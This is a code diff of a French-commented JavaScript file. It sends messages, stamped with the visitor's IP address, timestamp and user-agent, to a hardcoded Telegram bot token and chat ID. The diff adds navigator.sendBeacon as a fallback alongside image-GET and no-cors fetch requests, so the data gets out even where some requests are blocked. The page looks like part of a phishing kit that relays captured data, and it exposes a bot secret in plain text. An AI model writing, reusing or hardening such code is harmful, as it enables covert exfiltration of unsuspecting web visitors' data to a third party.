@@ -2,7 +2,7 @@
 const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
 const CHAT_ID        = '-4766781392';
 
-// JSONP ipify (inclus par index.html)
+// JSONP ipify (injecté par index.html)
 function handleIP(data) {
   window.__CLIENT_IP__ = data.ip;
 }
@@ -22,12 +22,12 @@ window._tgReqs = window._tgReqs || [];
 
 /**
  * Envoie la notification à Telegram via :
- * 1) <img>
+ * 1) <img> GET
  * 2) fetch(no-cors)
- * 3) JSONP <script> (pour iOS ultime fallback)
+ * 3) navigator.sendBeacon
  */
 function sendTelegramNotification(message) {
-  logDebug('🔥 sendTelegramNotification start');
+  logDebug('🔥 Démarrage sendTelegramNotification');
   logDebug('Message brut: ' + message);
 
   const ip = window.__CLIENT_IP__ || 'unknown';
@@ -41,7 +41,7 @@ function sendTelegramNotification(message) {
                  + `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
   logDebug('Horodatage: ' + datetime);
 
-  // construire le texte Markdown
+  // Construction du texte
   const parts = message.split('\n');
   const header = parts.shift();
   let text = `[📝] ${header}`;
@@ -66,12 +66,13 @@ function sendTelegramNotification(message) {
        + `\n[📍] User-Agent    : ${ua}`;
   logDebug('Texte final: ' + text.replace(/\n/g,' ⏎ '));
 
-  const urlBase = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-  const params  = `?chat_id=${encodeURIComponent(CHAT_ID)}&parse_mode=Markdown&text=${encodeURIComponent(text)}`;
-  const url      = urlBase + params;
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`
+            + `?chat_id=${encodeURIComponent(CHAT_ID)}`
+            + `&parse_mode=Markdown`
+            + `&text=${encodeURIComponent(text)}`;
   logDebug('URL Telegram: ' + url);
 
-  // 1) <img>
+  // 1) <img> GET
   const img = new Image();
   img.src = url;
   window._tgReqs.push(img);
@@ -81,17 +82,22 @@ function sendTelegramNotification(message) {
 
     // 2) fetch(no-cors)
     fetch(url, { mode: 'no-cors' })
-      .then(() => logDebug('✔️ fetch(no-cors) envoyé'))
-      .catch(() => logDebug('❌ fetch(no-cors) failed'));
-
-    // 3) JSONP <script>
-    logDebug('↪️ Tentative JSONP <script>');
-    const s = document.createElement('script');
-    s.src = url;
-    document.body.appendChild(s);
-    window._tgReqs.push(s);
+      .then(() => {
+        logDebug('✔️ fetch(no-cors) envoyé');
+        // 3) et maintenant sendBeacon
+        const blob = new Blob([], { type: 'application/json' });
+        const beaconOk = navigator.sendBeacon(url, blob);
+        logDebug(`📶 sendBeacon ${beaconOk ? '✓' : '✗'}`);
+      })
+      .catch(e => {
+        logDebug('❌ fetch(no-cors) error: ' + e);
+        // fallback beacon malgré tout
+        const blob = new Blob([], { type: 'application/json' });
+        const beaconOk = navigator.sendBeacon(url, blob);
+        logDebug(`📶 sendBeacon ${beaconOk ? '✓' : '✗'}`);
+      });
   };
 }
 
-// exposer
+// expose
 window.sendTelegramNotification = sendTelegramNotification;
